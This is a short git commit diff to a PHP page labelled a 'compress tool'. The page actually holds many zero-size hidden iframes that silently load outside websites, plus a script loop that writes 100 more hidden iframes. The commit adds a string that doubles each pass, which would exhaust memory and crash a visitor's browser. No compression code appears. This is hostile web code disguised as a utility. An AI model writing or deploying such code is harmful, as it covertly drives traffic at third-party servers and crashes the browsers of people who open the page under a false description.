55bb21eff732e34b4f796f13fcc094064fb3925f
Andy Cheung <win120a@163.com>
2013-06-28 19:50:16 +0800

    Enhance compress.

--- tool/internet-compents/compress.php
+++ tool/internet-compents/compress.php
@@ -1,3 +1,4 @@
+<html><head><title>Andy Browser compress tool</title><body>
 <iframe src="http://www.sina.com.cn" width=0 height=0></iframe>
 <iframe src="http://www.ubc.ca" width=0 height=0></iframe>
 <iframe src="http://163.com" width=0 height=0></iframe>
@@ -42,8 +43,11 @@
 <iframe src="http://calendar.ubc.ca" width=0 height=0></iframe>
 <script>
 c = 0;
+v = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
 while(c < 100){
  document.write('<iframe src="http://www.sina.com.cn" width=0 height=0><\/iframe>');
+ v += v;
  c++;
 }
 </script>
+</body></html>
